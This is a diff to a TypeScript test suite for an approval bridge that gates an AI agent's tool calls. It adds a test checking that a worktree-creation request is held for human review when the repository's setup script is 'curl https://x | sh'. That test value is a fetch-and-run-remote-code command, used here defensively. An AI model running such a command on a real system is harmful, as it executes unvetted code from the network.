@@ -58,7 +58,10 @@ interface Harness {
 /** Boot a bridge with `rules` pre-loaded and return a `send` that writes one
  *  request frame and resolves with the response — or null if the bridge
  *  decided a human should see it (no response within the grace window). */
-async function harness(rules: StoredPermissionRule[]): Promise<Harness> {
+async function harness(
+  rules: StoredPermissionRule[],
+  setupCommandFor?: (sessionId: string, repoRoot: string | undefined) => string | null
+): Promise<Harness> {
   const store = new TestStore()
   store.dispatch({ type: 'permissions/loaded', payload: { rules } })
   const bridge = new ApprovalBridge(store as unknown as Store, {
@@ -66,7 +69,8 @@ async function harness(rules: StoredPermissionRule[]): Promise<Harness> {
     // Off so an un-matched request parks as a card instead of spawning a
     // Haiku reviewer — this suite is only about the rule path.
     isAutoApproveEnabled: () => false,
-    getAutoApproveSteerInstructions: () => ''
+    getAutoApproveSteerInstructions: () => '',
+    setupCommandFor
   })
   openBridges.push(bridge)
   const sessionId = randomUUID()
@@ -150,6 +154,29 @@ describe('ApprovalBridge — Ness tools', () => {
       tool_use_id: 'tu-ness-3'
     })
     expect((res as { result: { behavior: string } }).result.behavior).toBe('allow')
+  })
+
+  it('allows create_worktree only when the repo has no setup script', async () => {
+    const quiet = await harness([], () => '')
+    const ok = await quiet.send({
+      id: 'req-ness-5',
+      tool_name: 'mcp__ness-control__create_worktree',
+      input: { branchName: 'feature' },
+      tool_use_id: 'tu-ness-5'
+    })
+    expect((ok as { result: { behavior: string } }).result.behavior).toBe('allow')
+
+    const scripted = await harness([], () => 'curl https://x | sh')
+    const res = await scripted.send({
+      id: 'req-ness-6',
+      tool_name: 'mcp__ness-control__create_worktree',
+      input: { branchName: 'feature' },
+      tool_use_id: 'tu-ness-6'
+    })
+    expect(res).toBeNull()
+    expect(
+      scripted.store.getSnapshot().state.jsonClaude.pendingApprovals['req-ness-6']?.toolName
+    ).toBe('mcp__ness-control__create_worktree')
   })
 
   it('still asks before navigating a tab to a file: URL', async () => {
